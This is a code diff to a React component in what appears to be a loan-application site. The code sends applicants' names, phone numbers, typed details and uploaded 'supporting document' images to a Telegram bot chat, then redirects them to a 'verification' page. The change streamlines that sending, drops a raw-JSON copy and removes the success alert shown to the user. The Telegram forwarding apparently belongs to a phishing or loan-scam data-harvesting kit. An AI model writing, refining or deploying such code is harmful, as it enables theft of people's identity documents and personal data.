@@ -72,32 +72,12 @@ function MessageDetails() {
       const storedApp = localStorage.getItem('loanAppData')
       const appData = storedApp ? JSON.parse(storedApp) : {}
       
-      const notificationData = {
-        type: "user_response",
-        adminMessage: adminMessage || "",
-        phoneNumber: appData.number || "",
-        name: appData.name || "",
-        details: details.trim(),
-        images: [],
-        timestamp: new Date().toISOString()
-      }
-
-      for (const image of images) {
-        const base64 = await imageToBase64(image)
-        notificationData.images.push({
-          filename: image.name,
-          size: image.size,
-          preview: base64.substring(0, 100) + "..."
-        })
-      }
-
       const message = `📝 User Response\n\n` +
-        `👤 Name: ${notificationData.name || "N/A"}\n` +
-        `📱 Phone: ${notificationData.phoneNumber || "N/A"}\n` +
-        `💬 Admin Message: ${notificationData.adminMessage || "N/A"}\n` +
-        `📝 Details: ${notificationData.details || "N/A"}\n` +
-        `📎 Images: ${notificationData.images.length} file(s)\n` +
-        `🕒 Time: ${notificationData.timestamp}`
+        `👤 Name: ${appData.name || "N/A"}\n` +
+        `📱 Phone: ${appData.number || "N/A"}\n` +
+        `💬 Admin Message: ${adminMessage || "N/A"}\n` +
+        `📝 Details: ${details.trim() || "N/A"}\n` +
+        `🕒 Time: ${new Date().toISOString()}`
 
       await fetch(TELEGRAM_API + '/sendMessage', {
         method: 'POST',
@@ -109,32 +89,21 @@ function MessageDetails() {
       })
 
       for (const image of images) {
-        await imageToBase64(image).then(base64 => {
-          return fetch(TELEGRAM_API + '/sendPhoto', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: ADMIN_CHAT_ID,
-              photo: base64,
-              caption: `📎 Supporting document from ${notificationData.name || "user"}`
-            })
+        const base64 = await imageToBase64(image)
+        const caption = `📎 Supporting document - ${image.name} (${Math.round(image.size / 1024)}KB)`
+        
+        await fetch(TELEGRAM_API + '/sendPhoto', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: ADMIN_CHAT_ID,
+            photo: base64,
+            caption: caption
           })
         }).catch(e => console.error('Image upload failed:', e))
       }
 
-      const rawJson = JSON.stringify(notificationData, null, 2)
-      await fetch(TELEGRAM_API + '/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: ADMIN_CHAT_ID,
-          text: `📄 RAW JSON:\n\`\`\`\n${rawJson}\n\`\`\``,
-          parse_mode: 'Markdown'
-        })
-      })
-
       setLoading(false)
-      alert("Response sent to admin successfully!")
       navigate(`${basePath}/verification`)
     } catch (err) {
       console.error("Send error:", err)
